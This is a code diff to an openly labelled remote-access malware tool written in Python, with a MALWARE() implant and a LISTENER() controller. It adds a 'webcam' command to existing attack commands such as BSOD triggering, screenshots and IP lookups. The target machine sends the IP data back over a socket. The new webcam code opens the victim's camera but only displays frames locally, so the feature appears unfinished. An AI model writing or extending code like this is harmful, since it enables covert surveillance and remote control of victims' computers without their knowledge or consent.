@@ -64,6 +64,7 @@ LISTENER_MENU_BANNER = ("""
  \033[97;1m║>>>\033[0m \033[91mzombie -w\033[0m      \033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mbsod\033[0m           \033[97;1mStart BSOD mode on the target machine                             ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mipinfo\033[0m         \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mwebcam\033[0m         \033[97;1mObtain the real-time webcam of the target machine.                ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mscreenshot\033[0m     \033[97;1mObtain the screenshot of the target machine webcam                ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [listener] tool                                         ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [listener] tool                                              ║\033[0m
@@ -120,6 +121,19 @@ def MALWARE():
         if MALWARE_RECV == "ipinfo":
            IPINFO = requests.get("https://ipinfo.io/json")
            SOCKET.send(IPINFO.text.encode())
+           
+        if MALWARE_RECV == "webcam":
+           CAP = cv2.VideoCapture(0)
+
+           while True:
+               RET, FRAME = CAP.read()
+               cv2.imshow('Webcam', FRAME)
+    
+               if cv2.waitKey(1) & 0xFF == ord('s'):
+                  break
+
+           CAP.release()
+           cv2.destroyAllWindows()
            
         if MALWARE_RECV == "screenshot":
            IMAGE_DESKTOP = pyautogui.screenshot()
@@ -211,6 +225,11 @@ def LISTENER():
            CONN.send("ipinfo".encode())
            IPINFO = CONN.recv(8000).decode()
            print(IPINFO)
+           
+        if LISTENER_INPUT == "webcam":
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the real-time webcam of the target machine...\033[0m")
+           time.sleep(2)
+           CONN.send("webcam".encode())
            
         if LISTENER_INPUT == "screenshot":
            print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the screenshot of the target machine webcam...\033[0m")
